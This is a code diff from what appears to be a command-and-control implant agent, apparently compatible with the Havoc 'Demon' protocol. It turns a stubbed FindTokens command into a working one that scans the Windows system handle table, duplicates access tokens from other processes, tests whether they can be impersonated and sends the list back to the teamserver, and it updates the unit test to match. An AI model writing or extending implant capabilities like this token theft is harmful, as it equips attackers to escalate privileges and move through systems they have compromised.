@@ -2382,26 +2382,41 @@ fn handle_token_clear(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult
 
 /// `COMMAND_TOKEN / FindTokens (10)` — enumerate tokens available on the system.
 ///
-/// This is a Windows-only advanced capability that scans the system handle table.
-/// On non-Windows platforms, it returns `success = 0`.
+/// Performs a full system-wide handle-table scan using
+/// `NtQuerySystemInformation(SystemHandleInformation)`, duplicates every
+/// token-type handle into the current process, tests impersonatability, and
+/// returns the deduplicated list to the teamserver.
 ///
-/// Outgoing payload (LE): `[subcmd: u32][success: u32]` then if success:
-///   `[count: u32]` then for each token:
-///   `[username: wstring][pid: u32][handle: u32][integrity: u32][impersonation: u32][token_type: u32]`
+/// On non-Windows platforms `list_found_tokens()` returns an empty list and the
+/// response carries `success = TRUE` with `count = 0`.
+///
+/// Outgoing payload (LE): `[subcmd: u32][success: u32=1][count: u32]` then for
+/// each token: `[username: wstring][pid: u32][handle: u32][integrity: u32]`
+///             `[impersonation: u32][token_type: u32]`
 fn handle_token_find(subcmd_raw: u32) -> DispatchResult {
-    // FindTokens requires NtQuerySystemInformation(SystemHandleInformation) which
-    // is not exposed through windows-sys.  For now, report not-supported so the
-    // teamserver knows the sub-command was received but the agent cannot fulfil it.
-    //
-    // A full implementation would iterate the system handle table, duplicate token
-    // handles from other processes, and query their metadata.  This will be added
-    // in a follow-up issue once the NT syscall wrappers are available.
+    use crate::token::native;
 
-    info!("Token::FindTokens: not yet implemented — returning empty");
+    info!("Token::FindTokens: scanning system handle table");
+
+    let tokens = native::list_found_tokens();
+
+    info!(count = tokens.len(), "Token::FindTokens: scan complete");
 
     let mut out = Vec::new();
     write_u32_le(&mut out, subcmd_raw);
-    write_u32_le(&mut out, 0); // success = FALSE
+    write_u32_le(&mut out, 1); // success = TRUE
+
+    #[allow(clippy::cast_possible_truncation)]
+    write_u32_le(&mut out, tokens.len() as u32);
+
+    for tok in &tokens {
+        write_utf16le(&mut out, &tok.domain_user);
+        write_u32_le(&mut out, tok.process_id);
+        write_u32_le(&mut out, tok.handle);
+        write_u32_le(&mut out, tok.integrity_level);
+        write_u32_le(&mut out, tok.impersonation_level);
+        write_u32_le(&mut out, tok.token_type);
+    }
 
     DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
 }
@@ -5899,7 +5914,7 @@ mod tests {
     // ── Token::FindTokens ───────────────────────────────────────────────────
 
     #[test]
-    fn token_find_returns_not_supported() {
+    fn token_find_returns_success_with_empty_list_on_non_windows() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::new();
@@ -5918,8 +5933,11 @@ mod tests {
         let mut off = 0;
         let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
         assert_eq!(subcmd, u32::from(DemonTokenCommand::FindTokens));
+        // On non-Windows the stub returns success=TRUE with count=0.
         let success = parse_u32_le(&resp.payload, &mut off).expect("success");
-        assert_eq!(success, 0); // Not yet implemented
+        assert_eq!(success, 1);
+        let count = parse_u32_le(&resp.payload, &mut off).expect("count");
+        assert_eq!(count, 0);
     }
 
     // ── Token::PrivsGetOrList ───────────────────────────────────────────────
